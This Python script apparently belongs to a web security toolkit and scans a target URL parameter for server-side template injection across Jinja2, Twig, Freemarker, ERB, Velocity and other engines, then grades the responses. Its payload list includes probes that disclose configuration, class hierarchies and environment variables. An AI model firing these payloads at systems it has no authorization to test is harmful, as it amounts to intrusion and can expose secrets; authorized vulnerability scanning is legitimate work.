#!/usr/bin/env python3
"""Server-Side Template Injection (SSTI) detection.

Tests for Jinja2, Twig, Velocity, ERB, Freemarker, and generic polyglot payloads.

Usage:
    python3 test-ssti.py '{"target": "https://example.com/render?template=", "parameter": "template"}'
"""

import sys
import json
import requests
import urllib3
from urllib.parse import quote, urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10

# Payload definitions: (name, engine, payload, expected_output)
PAYLOADS = [
    # Math-based detection (safe, universally detectable)
    ("jinja2_math", "Jinja2", "{{7*7}}", "49"),
    ("jinja2_string", "Jinja2", "{{7*'7'}}", "7777777"),
    ("twig_math", "Twig", "{{7*7}}", "49"),
    ("twig_range", "Twig", "{{7*'7'}}", "49"),
    ("velocity_math", "Velocity", "#set($x=7*7)${x}", "49"),
    ("erb_math", "ERB", "<%=7*7%>", "49"),
    ("freemarker_math", "Freemarker", "${7*7}", "49"),
    ("smarty_math", "Smarty", "{7*7}", "49"),
    ("mako_math", "Mako", "${7*7}", "49"),
    ("pebble_math", "Pebble", "{{7*7}}", "49"),

    # Polyglot detection payload
    ("polyglot", "Generic", "${{<%[%'\"}}%\\", None),

    # Information disclosure (non-destructive)
    ("jinja2_config", "Jinja2", "{{config}}", "<Config"),
    ("jinja2_class", "Jinja2", "{{self.__class__}}", "__class__"),
    ("jinja2_mro", "Jinja2", "{{''.__class__.__mro__}}", "class"),
    ("twig_env", "Twig", "{{_self.env}}", "Environment"),
    ("freemarker_class", "Freemarker", "${object.class}", "class"),
    ("erb_env", "ERB", "<%=ENV%>", "ENV"),
    ("velocity_class", "Velocity", "$class.inspect()", "class"),

    # Error-based detection
    ("jinja2_error", "Jinja2", "{{foobar}}", None),
    ("freemarker_error", "Freemarker", "${foobar}", None),
    ("twig_error", "Twig", "{{foobar}}", None),
]

# Error signatures that indicate template processing
TEMPLATE_ERROR_SIGNATURES = [
    "TemplateSyntaxError",
    "UndefinedError",
    "jinja2",
    "twig",
    "freemarker",
    "velocity",
    "TemplateError",
    "RenderError",
    "ParseError",
    "template not found",
    "undefined variable",
    "cannot resolve",
    "smarty",
    "mako",
]


def get_baseline(url, headers=None, method="GET", data=None):
    """Get a baseline response with a benign value."""
    try:
        if method.upper() == "POST":
            resp = requests.post(url, data=data or {}, headers=headers or {},
                                 timeout=TIMEOUT, verify=False)
        else:
            resp = requests.get(url, headers=headers or {},
                                timeout=TIMEOUT, verify=False)
        return {
            "status_code": resp.status_code,
            "content_length": len(resp.content),
            "body": resp.text,
        }
    except requests.RequestException:
        return None


def inject_payload(target, parameter, payload, headers=None, method="GET"):
    """Inject a payload into the target parameter."""
    req_headers = headers or {}

    try:
        if parameter:
            # Target is base URL; inject into specified parameter
            parsed = urlparse(target)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[parameter] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            if method.upper() == "POST":
                # Use the URL without query, send params as POST data
                post_url = urlunparse(parsed._replace(query=""))
                resp = requests.post(post_url, data={parameter: payload},
                                     headers=req_headers, timeout=TIMEOUT, verify=False)
            else:
                resp = requests.get(test_url, headers=req_headers,
                                    timeout=TIMEOUT, verify=False)
        else:
            # Target URL already contains the injection point (append payload)
            test_url = target + quote(payload, safe="")
            if method.upper() == "POST":
                resp = requests.post(test_url, headers=req_headers,
                                     timeout=TIMEOUT, verify=False)
            else:
                resp = requests.get(test_url, headers=req_headers,
                                    timeout=TIMEOUT, verify=False)

    except requests.RequestException as e:
        return {"error": str(e)}

    return {
        "status_code": resp.status_code,
        "content_length": len(resp.content),
        "body": resp.text,
        "response_time": resp.elapsed.total_seconds(),
    }


def analyze_response(resp_data, payload_info, baseline):
    """Analyze a response for signs of SSTI."""
    name, engine, payload, expected = payload_info
    body = resp_data.get("body", "")
    findings = []
    confidence = "none"

    # Check for expected output (math result)
    if expected and expected in body:
        # Make sure it's not just reflected as-is
        if payload not in body:
            findings.append(f"Expected output '{expected}' found in response")
            confidence = "high"
        elif expected in body:
            # Even if payload is also in body, the computed result being present is notable
            findings.append(f"Expected output '{expected}' present (may be computed)")
            confidence = "medium"

    # Check for template error signatures
    body_lower = body.lower()
    for sig in TEMPLATE_ERROR_SIGNATURES:
        if sig.lower() in body_lower:
            findings.append(f"Template error signature detected: {sig}")
            if confidence == "none":
                confidence = "low"

    # Check for response differences from baseline
    if baseline:
        if resp_data.get("status_code") != baseline.get("status_code"):
            findings.append(
                f"Status code changed: {baseline['status_code']} -> {resp_data['status_code']}"
            )
            if confidence == "none":
                confidence = "low"

        len_diff = abs(resp_data.get("content_length", 0) - baseline.get("content_length", 0))
        if len_diff > 50:
            findings.append(f"Response size difference: {len_diff} bytes")

    return {
        "name": name,
        "engine": engine,
        "payload": payload,
        "expected_output": expected,
        "status_code": resp_data.get("status_code"),
        "content_length": resp_data.get("content_length"),
        "response_time": resp_data.get("response_time"),
        "confidence": confidence,
        "findings": findings,
        "vulnerable": confidence in ("high", "medium"),
    }


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: test-ssti.py '{\"target\": \"...\", \"parameter\": \"...\"}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    target = args.get("target")
    if not target:
        print(json.dumps({"error": "Missing required parameter: target"}))
        sys.exit(1)

    parameter = args.get("parameter")
    headers = args.get("headers", {})
    method = args.get("method", "GET")
    engines_filter = args.get("engines", [])  # Optional: filter to specific engines

    # Get baseline
    baseline = get_baseline(target, headers, method)

    results = []
    vulnerable_engines = set()

    for payload_info in PAYLOADS:
        name, engine, payload, expected = payload_info

        # Apply engine filter if specified
        if engines_filter and engine not in engines_filter:
            continue

        resp_data = inject_payload(target, parameter, payload, headers, method)
        if "error" in resp_data:
            results.append({
                "name": name,
                "engine": engine,
                "payload": payload,
                "error": resp_data["error"],
            })
            continue

        analysis = analyze_response(resp_data, payload_info, baseline)
        results.append(analysis)

        if analysis["vulnerable"]:
            vulnerable_engines.add(engine)

    # Determine overall severity
    high_confidence = [r for r in results if r.get("confidence") == "high"]
    medium_confidence = [r for r in results if r.get("confidence") == "medium"]

    if high_confidence:
        severity = "critical"
    elif medium_confidence:
        severity = "high"
    elif any(r.get("confidence") == "low" for r in results):
        severity = "medium"
    else:
        severity = "info"

    output = {
        "target": target,
        "parameter": parameter,
        "payloads_tested": len(results),
        "vulnerable_engines": list(vulnerable_engines),
        "severity": severity,
        "high_confidence_findings": high_confidence,
        "medium_confidence_findings": medium_confidence,
        "all_results": results,
        "summary": (
            f"Tested {len(results)} SSTI payloads against {target}. "
            f"Vulnerable engines detected: {list(vulnerable_engines) if vulnerable_engines else 'none'}."
        ),
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
